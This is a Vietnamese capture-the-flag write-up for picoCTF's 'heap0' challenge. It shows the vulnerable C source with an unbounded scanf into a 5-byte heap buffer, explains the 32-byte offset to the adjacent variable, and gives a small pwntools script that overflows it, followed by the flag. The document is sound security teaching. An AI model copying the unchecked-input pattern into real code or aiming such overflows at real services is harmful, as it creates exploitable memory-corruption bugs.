# Heap_0
Đến với bài này, đây là một bài ở mức `dễ` nên chắc nó dễ thật =))))

Challenge cho chúng ta 2 file, một file binary `chall` và một file .c `chall.c`. Mở file .c thì ta có source của chương trình như sau:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap0!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	int rval = scanf("%d", &choice);
	if (rval == EOF){
	    exit(0);
	}
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
	    exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

Ta thấy chương trình sẽ chạy như sau:
- Khởi tạo heap bằng cách gọi hàm `init()`
- In ra nội dung của heap bằng cách gọi hàm `print_heap()`
- Khởi tạo menu bằng cách gọi hàm `print_menu()`
- Dựa vào input mà người dùng nhập vào, thực hiện các thao tác khác nhau với heap.

Ta nhìn vào hàm `check_win()`.

``` c
void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```

Điều kiện để in flag là dữ liệu được lưu nơi địa chỉ mà `safe_var` trỏ đến khác với chuỗi `bico`.

Tiếp tục nhìn vào hàm `write_buffer()` ta thấy rằng việc nhập vào không giới hạn kí tự (ở lựa chọn số 2).

``` c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

Khởi chạy local:

![image](https://github.com/user-attachments/assets/4819b7d2-cb88-4fba-981b-bc44678ce2d2)

Ta thấy input nhập vào sẽ bắt đầu lưu trữ từ địa chỉ `0x627d6e71a6b0` và địa chỉ mà con trỏ `safe_var` trỏ đến là `0x627d6e71a6d0`. Ta có offset là 32 bytes, giờ ta sẽ nhập 33 kí tự 'a' để làm thay đổi dữ liệu được lưu trữ ở địa chỉ `0x627d6e71a6d0`.

![image](https://github.com/user-attachments/assets/fc16681f-189a-44a2-b782-2f3f0cbc6383)

Ta thấy dữ liệu được lưu trữ ở địa chỉ `0x627d6e71a6d0` đã thành a.

![image](https://github.com/user-attachments/assets/5e77f26a-51cb-41c3-9a3d-f54ef6fa15d4)

Và tôi `Win`, giờ ta có file exploit như sau:

``` python
from pwn import *

#p = process('./chall')
p = remote('tethys.picoctf.net', 53076)
write = b'2'
flag = b'4'
payload = 33 * 'a'
p.sendline(write)
p.sendline(payload)
p.sendline(flag)
p.interactive()
```

Và ta có flag:
```
picoCTF{my_first_heap_overflow_0c473fe8}
```
